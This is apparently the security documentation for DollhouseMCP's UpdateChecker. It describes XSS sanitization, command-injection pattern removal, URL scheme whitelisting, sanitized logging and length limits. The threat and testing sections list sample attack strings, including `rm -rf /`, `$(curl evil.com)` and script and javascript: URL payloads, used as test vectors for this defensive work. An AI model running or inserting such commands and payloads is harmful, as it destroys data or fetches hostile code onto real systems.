# Security Documentation - DollhouseMCP

## UpdateChecker Security Implementation

This document provides comprehensive details about the security measures implemented in the UpdateChecker component, addressing all concerns raised in PR reviews #69 and #70.

### Overview

The UpdateChecker component fetches release information from GitHub's API and displays it to users. This creates several security risks that have been comprehensively addressed:

1. **Cross-Site Scripting (XSS)** - Malicious JavaScript in release notes
2. **Command Injection** - Shell commands in displayed content
3. **Information Disclosure** - Sensitive data in logs
4. **Denial of Service** - Excessive content length
5. **URL Manipulation** - Dangerous URL schemes

### Security Measures Implemented

#### 1. XSS Protection (HIGH PRIORITY)

**Threat**: Malicious actors could inject JavaScript into GitHub release notes that executes when displayed.

**Mitigation**:
- **DOMPurify Integration**: Server-side HTML sanitization using DOMPurify with JSDOM
- **Strict Configuration**: 
  ```typescript
  {
    ALLOWED_TAGS: [],      // No HTML tags allowed
    ALLOWED_ATTR: [],      // No attributes allowed
    FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'link'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  }
  ```
- **Result**: All HTML/JavaScript is stripped before display

**Test Coverage**: `UpdateChecker.security.test.ts` - "should sanitize release notes in format output"

#### 2. Command Injection Prevention

**Threat**: Shell commands could be embedded in release notes (e.g., `` `rm -rf /` ``, `$(curl evil.com)`)

**Mitigation**:
- **Regex Pattern Removal**: Multiple patterns removed in single pass
  - Backtick expressions: `/`[^`]*`/g`
  - Command substitution: `/\$\([^)]*\)/g`
  - Variable expansion: `/\$\{[^}]*\}/g`
  - PHP tags: `/<\?[^>]*\?>/g`
  - ASP tags: `/<%[^>]*%>/g` and `/&lt;%[^>]*%&gt;/g`
  - Hex escapes: `/\\x[0-9a-fA-F]{2}/g`
  - Unicode escapes: `/\\u[0-9a-fA-F]{4}/g`
  - Octal escapes: `/\\[0-7]{1,3}/g`

**Test Coverage**: Complete pattern testing in performance tests

#### 3. URL Security

**Threat**: Malicious URL schemes like `javascript:alert('xss')` or `data:text/html,<script>...</script>`

**Mitigation**:
- **Whitelist Approach**: Only `http:` and `https:` schemes allowed
- **URL Length Validation**: Maximum 2048 characters (configurable)
- **Invalid URL Handling**: Malformed URLs return empty string

**Test Coverage**: URL validation tests with various dangerous schemes

#### 4. Information Disclosure Prevention

**Threat**: Sensitive information could be exposed in security logs

**Mitigation**:
- **Sanitized Logging**:
  - Long URLs: Only first 50 characters logged
  - Dangerous URLs: Only hostname logged, not full URL
  - Invalid URLs: Only length logged, not content
- **Example**:
  ```typescript
  this.logSecurityEvent('url_too_long', { 
    length: url.length, 
    maxLength: this.urlMaxLength,
    urlPrefix: url.substring(0, 50) + '...'  // Sanitized
  });
  ```

#### 5. DoS Prevention

**Threat**: Extremely long content could cause performance issues or crashes

**Mitigation**:
- **Configurable Length Limits**:
  - Release notes: Default 5000 characters
  - URLs: Default 2048 characters
- **Truncation**: Content exceeding limits is truncated with "..."
- **Security Event Logging**: Length violations are logged

#### 6. Performance Optimizations

**Security Benefit**: Faster processing reduces attack window

**Implementations**:
- **Cached DOMPurify**: Static instance reused across operations
- **Single-Pass Regex**: All patterns processed in one iteration
- **Memory Management**: `resetCache()` method for long-running processes

### Configuration Options

```typescript
new UpdateChecker(versionManager, {
  // Security configuration
  releaseNotesMaxLength: 10000,  // Custom limit
  urlMaxLength: 4096,             // Custom limit
  
  // Security monitoring
  securityLogger: (event, details) => {
    // Log to security monitoring system
    securityMonitor.log(event, details);
  }
});
```

### Security Events

The following events are logged when security measures are triggered:

| Event | Description | Details Logged |
|-------|-------------|----------------|
| `url_too_long` | URL exceeds max length | length, maxLength, urlPrefix (sanitized) |
| `dangerous_url_scheme` | Non-http(s) scheme detected | scheme, host (not full URL) |
| `invalid_url` | Malformed URL | urlLength (not content) |
| `release_notes_truncated` | Content exceeds max length | originalLength, maxLength |
| `html_content_removed` | HTML/JS was sanitized | removedLength |
| `injection_patterns_removed` | Command patterns removed | removedLength |

### Testing

Comprehensive test coverage ensures all security measures work correctly:

- **Security Tests**: 15 tests in `UpdateChecker.security.test.ts`
- **Performance Tests**: 12 tests in `UpdateChecker.performance.test.ts`
- **Attack Vectors Tested**:
  - XSS payloads: `<script>alert("xss")</script>`
  - Command injection: `` `rm -rf /` ``, `$(curl evil.com)`
  - URL manipulation: `javascript:`, `data:`, `file:`
  - Escape sequences: `\x3c`, `\u003c`, `\077`
  - Length attacks: 100KB+ content

### Type Safety

**Previous Issue**: Using `as any` to bypass TypeScript safety

**Resolution**: 
- Maintained type safety while working with JSDOM
- Documented why `any` type is used for JSDOM window
- No unsafe casts that could hide security issues

### PR Review Feedback Loop

**Issue Identified**: PR reviewers don't see comprehensive documentation when reviewing code, leading to concerns about already-addressed issues.

**Solution**: 
1. Include security documentation as code comments
2. Add comprehensive JSDoc for all security-critical methods
3. Create this SECURITY.md file for reference
4. Ensure commit messages include security context

### Future Considerations

1. **Content Security Policy**: Consider CSP headers for additional protection
2. **Rate Limiting**: Implement rate limits for update checks
3. **Signature Verification**: Verify GitHub release signatures
4. **Audit Logging**: Comprehensive audit trail for security events

### References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

This security implementation follows defense-in-depth principles with multiple layers of protection. Each layer is independently tested and documented to ensure comprehensive security coverage.